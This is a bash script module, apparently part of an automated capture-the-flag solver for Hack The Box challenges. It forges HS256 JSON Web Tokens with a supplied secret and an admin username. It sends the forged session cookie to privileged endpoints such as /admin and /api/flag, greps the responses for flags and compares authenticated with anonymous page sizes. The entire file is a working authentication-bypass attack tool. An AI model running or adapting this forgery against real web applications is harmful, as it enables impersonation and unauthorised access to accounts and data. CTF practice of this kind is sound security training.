#!/bin/bash
# jwt-forge.sh - JWT forgery against known or common secrets
# Source from pipeline.sh: source ./jwt-forge.sh
#
# Functions:
#   jwt_forge <base_url> [username] [secret] [cookie_name]

jwt_forge() {
    local base="$1"
    local username="${2:-admin}"
    local secret="$3"
    local cookie_name="${4:-session_token}"
    local silent="${5}"

    [ -z "$secret" ] && return 1

    # Forge the JWT
    local token=$(python3 -c "
import jwt, sys
try:
    print(jwt.encode({'username': '$username'}, '$secret', algorithm='HS256'))
except:
    sys.exit(1)
" 2>/dev/null)

    [ -z "$token" ] && return 1

    [ -z "$silent" ] && log "  [*] Forged JWT: $token (secret: $secret)"

    # Try common privileged endpoints
    for ep in /tickets /api/tickets /admin /api/admin /flag /api/flag; do
        local code=$(curl -sk -o /dev/null -w "%{http_code}" -b "$cookie_name=$token" "$base$ep" 2>/dev/null)
        if [ "$code" != "401" ] && [ "$code" != "403" ] && [ "$code" != "302" ] && [ "$code" != "404" ] && [ "$code" != "000" ]; then
            local body=$(curl -sk -b "$cookie_name=$token" "$base$ep" 2>/dev/null)
            log "  [+] JWT WORKED on $ep (HTTP $code) with secret: $secret"
            local flag=$(echo "$body" | grep -oE 'HTB\{[^}]+\}' | head -1)
            [ -n "$flag" ] && flag_found "$flag"
            return 0
        fi
    done

    # Also try GET / with admin cookie
    local flag=$(curl -sk -b "$cookie_name=$token" "$base/" 2>/dev/null | grep -oE 'HTB\{[^}]+\}' | head -1)
    [ -n "$flag" ] && flag_found "$flag"
    # Check if response differs from unauthenticated
    local anon_len=$(curl -sko /dev/null -w "%{size_download}" "$base/" 2>/dev/null)
    local auth_len=$(curl -sko /dev/null -w "%{size_download}" -b "$cookie_name=$token" "$base/" 2>/dev/null)
    local diff=$((auth_len - anon_len))
    [ "$diff" -gt 50 ] || [ "$diff" -lt -50 ] && log "  [+] JWT affects / response (diff=${diff}B) with secret: $secret"

    return 1
}
